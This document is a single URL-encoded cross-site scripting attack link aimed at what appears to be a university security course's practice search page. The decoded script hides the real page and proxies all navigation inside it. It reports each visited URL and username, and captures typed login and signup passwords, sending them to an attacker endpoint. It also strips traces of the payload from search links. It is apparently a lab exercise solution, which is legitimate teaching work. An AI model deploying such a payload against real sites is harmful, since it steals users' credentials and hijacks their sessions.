http://cs526-offline.cs.purdue.edu/project3/search?xssdefense=3&q=%3Cscript%3Efunction%20payload(attacker)%20%7B%0A%20%20%20var%20afterStack%20%3D%20%5B%5D%3B%0A%20%20%20var%20prevStack%20%3D%20%5B%5D%3B%0A%20%20%20var%20UID%20%3D%200%3B%0A%20%20%20var%20nextUIDBack%20%3D%200%3B%0A%20%20%20curHref%20%3D%20%60.%2F%60%3B%0A%20%20%20function%20pushStack(url)%20%7B%0A%20%20%20%20%20%20nextUIDBack%20%2B%3D%201%3B%0A%20%20%20%20%20%20window.history.pushState(%7B%20UID%3A%20nextUIDBack%20%7D%2C%20%60%60)%3B%0A%20%20%20%20%20%20prevStack.push(url)%3B%0A%20%20%20%7D%3B%0A%20%20%20function%20createAccount(username%2C%20password)%20%7B%0A%20%20%20%20%20%20%24.post(%60.%2Fcreate%60%2C%20%7B%20username%3A%20username%2C%20password%3A%20password%20%7D%2C%0A%20%20%20%20%20%20%20%20%20function%20(data%2C%20status)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(%60.%2F%60)%3B%0A%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%7D%0A%20%20%20function%20login(username%2C%20password)%20%7B%0A%20%20%20%20%20%20%24.post(%60.%2Flogin%60%2C%20%7B%20username%3A%20username%2C%20password%3A%20password%20%7D%2C%0A%20%20%20%20%20%20%20%20%20function%20(data%2C%20status)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(%60.%2F%60)%3B%0A%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%7D%0A%20%20%20window.addEventListener(%60popstate%60%2C%20function%20(event)%20%7B%0A%20%20%20%20%20%20var%20eventUID%3B%0A%20%20%20%20%20%20if%20(event.state%20%3D%3D%20null)%20%7B%0A%20%20%20%20%20%20%20%20%20eventUID%20%3D%200%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20else%20%7B%0A%20%20%20%20%20%20%20%20%20eventUID%20%3D%20event.state.UID%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20if%20(eventUID%20%3D%3D%20null)%20%7B%0A%20%20%20%20%20%20%20%20%20eventUID%20%3D%200%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20if%20(eventUID%20%3E%20UID)%20%7B%0A%20%20%20%20%20%20%20%20%20prevStack.push(curHref)%3B%0A%20%20%20%20%20%20%20%20%20newUrl%20%3D%20afterStack.pop()%3B%0A%20%20%20%20%20%20%20%20%20console.log(newUrl)%3B%0A%20%20%20%20%20%20%20%20%20proxy(newUrl)%3B%0A%20%20%20%20%20%20%7D%20else%20if%20(eventUID%20%3C%20UID)%20%7B%0A%20%20%20%20%20%20%20%20%20afterStack.push(curHref)%3B%0A%20%20%20%20%20%20%20%20%20newUrl%20%3D%20prevStack.pop()%3B%0A%20%20%20%20%20%20%20%20%20console.log(newUrl)%3B%0A%20%20%20%20%20%20%20%20%20proxy(newUrl)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%7D)%0A%20%20%20function%20proxy(href)%20%7B%0A%20%20%20%20%20%20curHref%20%3D%20href%3B%0A%0A%20%20%20%20%20%20if%20(nextUIDBack%20!%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20%20if%20(history.state%20%3D%3D%20null)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20UID%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20UID%20%3D%20history.state.UID%3B%0A%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20history.replaceState(history.state%2C%20%60%60)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%24(%60html%60).load(href%2C%20function%20()%20%7B%0A%20%20%20%20%20%20%20%20%20%24(%60html%60).show()%3B%0A%20%20%20%20%20%20%20%20%20var%20username%20%3D%20%24(%60%2342296b2449%60).text()%3B%0A%20%20%20%20%20%20%20%20%20if%20(username%20!%3D%20%60%60)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24.get(attacker%2C%20%7B%20event%3A%20%60nav%60%2C%20user%3A%20username%2C%20uri%3A%20href%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24.get(attacker%2C%20%7B%20event%3A%20%60nav%60%2C%20uri%3A%20href%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20if%20(href.includes(%60search%3F%60))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(%60a%60).each(function%20()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24(this).attr(%60href%60).includes(%60payload%60))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24(this).remove()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24(this).click(%60submit%60%2C%20function%20(event)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20event.preventDefault()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20proxy(%60.%2F%60%20%2B%20%24(this).attr(%60href%60).replace(%2F%20%2Fg%2C%20%60%2B%60))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20console.log(%60hrefBeforeEvent%24%7Bhref%7D%60)%0A%20%20%20%20%20%20%20%20%20%24(%60%230c43c71eb6%60).on(%60click%60%2C%20function%20(event)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20event.preventDefault()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20username%20%3D%20%24(%60%235fa821704c%60).val()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20password%20%3D%20%24(%60%234c090a88fa%60).val()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20pushStack(href)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24.get(%60%24%7Battacker%7D%60%2C%20%60event%3Dlogin%26user%3D%24%7Busername%7D%26pass%3D%24%7Bpassword%7D%60)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20login(username%2C%20password)%3B%0A%20%20%20%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%24(%60%23268ff4c061%60).on(%60click%60%2C%20function%20(event)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20event.preventDefault()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20username%20%3D%20%24(%60%235fa821704c%60).val()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20password%20%3D%20%24(%60%234c090a88fa%60).val()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20pushStack(href)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24.get(%60%24%7Battacker%7D%60%2C%20%7B%20event%3A%20%60createacc%60%2C%20user%3A%20username%2C%20pass%3A%20password%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20createAccount(username%2C%20password)%0A%20%20%20%20%20%20%20%20%20%7D)%3B%0A%0A%20%20%20%20%20%20%20%20%20%24(%60%23290100273c%60).on(%60click%60%2C%20function%20(event)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20event.preventDefault()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20searchTerm%20%3D%20%24(%60%23f8e9b578c2%60).val().replace(%2F%20%2Fg%2C%20%60%2B%60)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20pushStack(href)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(%60.%2Fsearch%3Fq%3D%24%7BsearchTerm%7D%60)%3B%0A%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%24(%60%237fee37129b%60).on(%60click%60%2C%20function%20(event)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20event.preventDefault()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20pushStack(href)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(%60.%2F%60)%3B%0A%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%24(%60%239301c5b946%60).on(%60click%60%2C%20function%20(event)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20event.preventDefault()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20pushStack(href)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(%60.%2F%60)%3B%0A%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%24(%60%23c73d318062%60).on(%60click%60%2C%20function%20(event)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20event.preventDefault()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20username%20%3D%20%24(%60%2342296b2449%60).text()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20pushStack(href)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24.get(%60%24%7Battacker%7D%60%2C%20%7B%20event%3A%20%60logout%60%2C%20username%3A%20username%20%7D)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24.post(%60.%2Flogout%60%2C%20%7B%20username%3A%20username%20%7D%2C%20function%20()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20proxy(%60.%2F%60)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%7D)%3B%0A%20%20%20%7D%0A%20%20%20%24(%60html%60).hide()%3B%0A%20%20%20proxy(%60.%2F%60)%3B%0A%7D%3Bpayload(%60http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%60)%3B%3C%2Fscript%3E